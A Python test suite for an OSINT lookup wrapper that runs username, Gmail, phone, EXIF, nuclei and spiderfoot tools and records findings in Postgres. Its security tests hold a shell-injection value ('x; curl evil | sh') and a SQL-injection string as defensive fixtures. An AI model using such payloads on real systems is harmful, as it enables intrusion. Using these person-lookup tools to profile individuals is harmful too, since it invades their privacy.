#!/usr/bin/env python3
"""Tests for nova_osint_lookup.py — the 7 house categories (Security, Performance, Retry, Unit,
Integration, Functional, Frame). Written by Jordan Koch (via Claude)."""
import importlib.util
import io
import json
import os
import re
import subprocess
import sys
import time
import types
import unittest
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path
from unittest.mock import MagicMock, patch

SCRIPTS = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(SCRIPTS))
SCRIPT = SCRIPTS / "nova_osint_lookup.py"
SRC = SCRIPT.read_text()
try:
    import psycopg2  # noqa: F401
except ImportError:
    pass


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


ol = _load("osint_under_test", SCRIPT)


class _Cur:
    def __init__(self):
        self.sql = []; self.closed = False

    def execute(self, sql, params=None):
        self.sql.append((" ".join(sql.split()), params))

    def close(self):
        self.closed = True


class _Conn:
    def __init__(self):
        self.cur = _Cur(); self.autocommit = False; self.closed = False

    def cursor(self):
        return self.cur

    def close(self):
        self.closed = True


def _cp(stdout="", stderr="", rc=0):
    return types.SimpleNamespace(stdout=stdout, stderr=stderr, returncode=rc)


def _run(argv, stdout="", stderr="", connect=None):
    """Run main() with the OSINT tool subprocess and PG mocked; returns (rc, conn, argv_seen, stdout, stderr)."""
    conn = _Conn()
    pg = types.SimpleNamespace(connect=connect or MagicMock(return_value=conn))
    with patch.object(ol.subprocess, "run", return_value=_cp(stdout, stderr)) as sp, patch.object(ol, "psycopg2", pg), \
         patch.object(sys, "argv", ["nova_osint_lookup.py", *argv]), redirect_stdout(io.StringIO()) as out, \
         redirect_stderr(io.StringIO()) as err:
        rc = ol.main()
    seen = [c.args[0] for c in sp.call_args_list]
    return rc, conn, seen, out.getvalue(), err.getvalue(), sp


class TestSecurity(unittest.TestCase):
    def test_no_hardcoded_credentials(self):
        pat = re.compile(r"(api[_-]?key|password|secret|token)\s*=\s*['\"][A-Za-z0-9+/]{16,}['\"]", re.I)
        self.assertIsNone(pat.search(SRC))
        self.assertNotIn("password", ol.DSN)

    def test_targets_are_argv_elements_never_a_shell_string(self):
        self.assertNotIn("shell=True", SRC); self.assertNotIn("os.system", SRC)
        evil = "x; curl evil | sh"
        for mode in ("username", "gmail", "phone", "nuclei", "spiderfoot", "exif"):
            rc, conn, seen, _, _, sp = _run([mode, evil])
            argv = seen[0]
            self.assertIsInstance(argv, list, mode)
            self.assertIn(evil, argv, mode)                                    # one discrete element
            self.assertFalse(sp.call_args[1].get("shell", False))

    def test_record_is_parameterized_and_writes_only_osint_findings(self):
        self.assertIsNone(re.search(r'execute\(\s*f"', SRC))
        writes = {m.group(1) for m in re.finditer(r"\b(?:INSERT INTO|UPDATE|DELETE FROM)\s+([\w.]+)", SRC)}
        self.assertEqual(writes, {"osint_findings"})
        conn = _Conn()
        evil = "h'); DROP TABLE osint_findings; --"
        with patch.object(ol, "psycopg2", types.SimpleNamespace(connect=MagicMock(return_value=conn))):
            ol.record("lookup:sherlock", evil, "profile_found", "[+] GitHub: x")
        sql, params = conn.cur.sql[0]
        self.assertNotIn("DROP", sql)
        self.assertEqual(params, ("lookup:sherlock", evil, "profile_found", "[+] GitHub: x", "{}", None))
        self.assertTrue(conn.autocommit); self.assertTrue(conn.closed); self.assertTrue(conn.cur.closed)

    def test_nuclei_is_pinned_to_the_safe_tag_allowlist_and_rate_limited(self):
        rc, conn, seen, _, _, _ = _run(["nuclei", "https://example.org"])
        argv = seen[0]
        self.assertEqual(argv[argv.index("-tags") + 1], ol.NUCLEI_SAFE_TAGS)
        for forbidden in ("dos", "fuzz", "intrusive"):
            self.assertNotIn(forbidden, ol.NUCLEI_SAFE_TAGS.split(","))
        self.assertEqual(argv[argv.index("-rate-limit") + 1], "50")
        self.assertEqual(ol.SPIDERFOOT_MODULES, "sfp_dnsresolve,sfp_crt")


class TestPerformance(unittest.TestCase):
    def test_10k_sherlock_hits_recorded_under_2s(self):
        out = "\n".join(f"[+] Site{i}: https://site{i}.example/handle" for i in range(10_000))
        t0 = time.perf_counter()
        rc, conn, _, text, _, _ = _run(["username", "handle"], stdout=out)
        self.assertLess(time.perf_counter() - t0, 2.0)
        self.assertEqual(len(conn.cur.sql), 10_000)
        self.assertIn("10000 profile(s) found", text)

    def test_10k_nuclei_jsonl_lines_parse_under_2s(self):
        lines = "\n".join(json.dumps({"template-id": f"t{i}", "matched-at": "u", "info": {"name": "n", "severity": "low"}}) for i in range(10_000))
        t0 = time.perf_counter()
        rc, conn, _, text, _, _ = _run(["nuclei", "https://h"], stdout=lines + "\nnot json\n")
        self.assertLess(time.perf_counter() - t0, 2.0)
        self.assertEqual(len(conn.cur.sql), 10_000)


class TestRetry(unittest.TestCase):
    def test_record_fails_open_when_pg_is_down(self):
        # RETRY GAP: record()/psycopg2.connect — one attempt; the finding is printed to the operator but a PG outage
        # only costs a stderr warning, never the lookup result.
        connect = MagicMock(side_effect=RuntimeError("pg down"))
        rc, conn, seen, out, err, _ = _run(["username", "handle"], stdout="[+] GitHub: https://github.com/handle\n", connect=connect)
        self.assertEqual(rc, 0)
        self.assertEqual(connect.call_count, 1)
        self.assertIn("[+] GitHub", out)
        self.assertIn("[warn] failed to record finding: pg down", err)

    def test_tool_timeout_is_one_shot_and_escapes(self):
        # RETRY GAP: cmd_*()/subprocess.run — no retry on a tool timeout; the error escapes to the operator and
        # nothing partial is written to osint_findings.
        connect = MagicMock()
        with patch.object(ol.subprocess, "run", side_effect=subprocess.TimeoutExpired("sherlock", 180)) as sp, \
             patch.object(ol, "psycopg2", types.SimpleNamespace(connect=connect)), redirect_stdout(io.StringIO()):
            with self.assertRaises(subprocess.TimeoutExpired):
                ol.cmd_username("handle")
        self.assertEqual(sp.call_count, 1)
        connect.assert_not_called()


class TestUnit(unittest.TestCase):
    def test_usage_paths_return_1_without_running_anything(self):
        for argv in ([], ["bogus"], ["username"], ["gmail"], ["nuclei"]):
            rc, conn, seen, out, _, _ = _run(argv)
            self.assertEqual(rc, 1, argv); self.assertEqual(seen, [], argv)
            self.assertIn("Usage:", out)

    def test_exif_parses_json_and_tolerates_garbage(self):
        entries = [{"SourceFile": "/tmp/a.jpg", "GPSLatitude": "34 deg"}, {"SourceFile": "/tmp/b.jpg"}]
        rc, conn, seen, out, _, _ = _run(["exif", "/tmp"], stdout=json.dumps(entries))
        self.assertEqual(seen[0], ["exiftool", "-j", "-a", "-G1", "/tmp"])
        self.assertEqual([p[1] for _, p in conn.cur.sql], ["/tmp/a.jpg", "/tmp/b.jpg"])
        self.assertEqual(json.loads(conn.cur.sql[0][1][4]), entries[0])
        rc, conn, _, _, _, _ = _run(["exif", "/tmp"], stdout="exiftool: not an image")
        self.assertEqual((rc, conn.cur.sql), (0, []))

    def test_spiderfoot_non_json_prints_and_records_nothing(self):
        rc, conn, seen, out, _, sp = _run(["spiderfoot", "example.org"], stdout="", stderr="sf: boom")
        self.assertEqual(rc, 0); self.assertEqual(conn.cur.sql, []); self.assertIn("sf: boom", out)
        self.assertEqual(sp.call_args[1]["cwd"], str(Path.home() / "spiderfoot"))

    def test_nuclei_severity_mapping(self):
        lines = "\n".join(json.dumps({"template-id": t, "matched-at": "https://h/x", "info": {"name": t, "severity": s}})
                          for t, s in (("a", "info"), ("b", "low"), ("c", "medium"), ("d", "high"), ("e", "critical"), ("f", "weird")))
        rc, conn, _, out, _, _ = _run(["nuclei", "https://h"], stdout=lines)
        self.assertEqual([p[5] for _, p in conn.cur.sql], ["info", "warning", "warning", "critical", "critical", "info"])
        self.assertEqual(json.loads(conn.cur.sql[1][1][4]), {"template-id": "b", "nuclei_severity": "low"})
        self.assertIn("6 finding(s) logged", out)


class TestIntegration(unittest.TestCase):
    def test_every_subtool_records_under_its_lookup_prefix_and_target(self):
        cases = [(["username", "h"], "[+] X: u\n", "lookup:sherlock", "h"),
                 (["gmail", "a@gmail.com"], "profile", "lookup:ghunt", "a@gmail.com"),
                 (["phone", "+14155552671"], "carrier: x", "lookup:phoneinfoga", "+14155552671"),
                 (["spiderfoot", "example.org"], json.dumps([{"type": "IP_ADDRESS", "data": "1.2.3.4", "module": "sfp_dnsresolve"}]), "lookup:spiderfoot", "example.org")]
        for argv, stdout, tool, target in cases:
            rc, conn, _, _, _, _ = _run(argv, stdout=stdout)
            self.assertEqual(rc, 0, argv)
            sql, params = conn.cur.sql[0]
            self.assertTrue(sql.startswith("INSERT INTO osint_findings (tool, target, finding_type, finding, metadata, severity)"))
            self.assertEqual((params[0], params[1]), (tool, target), argv)
        self.assertEqual(json.loads(conn.cur.sql[0][1][4]), {"module": "sfp_dnsresolve"})

    def test_tools_resolve_from_the_osint_venv_and_go_bin(self):
        rc, _, seen, _, _, _ = _run(["username", "h"])
        self.assertEqual(seen[0][0], str(ol.VENV / "sherlock"))
        rc, _, seen, _, _, _ = _run(["phone", "+1"])
        self.assertEqual(seen[0][0], str(ol.GO_BIN / "phoneinfoga"))
        self.assertTrue(str(ol.VENV).startswith(str(Path.home())))


class TestFunctional(unittest.TestCase):
    def test_golden_path_username_lookup(self):
        out = "[*] Checking username handle on:\n[+] GitHub: https://github.com/handle\n[-] Twitter: Not Found!\n[+] Reddit: https://reddit.com/u/handle\n"
        rc, conn, seen, text, err, sp = _run(["username", "handle"], stdout=out)
        self.assertEqual(rc, 0)
        self.assertEqual(seen[0][1:], ["handle", "--print-found", "--timeout", "10"])
        self.assertEqual(sp.call_args[1]["timeout"], 180)
        self.assertEqual([p[3] for _, p in conn.cur.sql], ["[+] GitHub: https://github.com/handle", "[+] Reddit: https://reddit.com/u/handle"])
        self.assertIn("2 profile(s) found, logged to osint_findings.", text)
        self.assertEqual(err, "")

    def test_gmail_falls_back_to_stderr_and_truncates_to_2000(self):
        rc, conn, _, text, _, _ = _run(["gmail", "a@gmail.com"], stdout="", stderr="e" * 5000)
        self.assertEqual(len(conn.cur.sql[0][1][3]), 2000)
        self.assertIn("e" * 100, text)


class TestFrame(unittest.TestCase):
    def test_no_args_prints_usage_and_import_never_runs_main(self):
        env = {**os.environ, "NOVA_TEST_QUIET": "1"}
        r = subprocess.run([sys.executable, str(SCRIPT)], capture_output=True, text=True, timeout=30, env=env)
        self.assertEqual(r.returncode, 1)                                      # usage exit, no tool launched
        self.assertIn("nova_osint_lookup.py username <handle>", r.stdout)
        self.assertIn('if __name__ == "__main__":\n    sys.exit(main())', SRC)
        r = subprocess.run([sys.executable, "-c", "import nova_osint_lookup"], cwd=str(SCRIPTS), capture_output=True, text=True, timeout=30, env=env)
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(r.stdout.strip(), "")


if __name__ == "__main__":
    unittest.main()
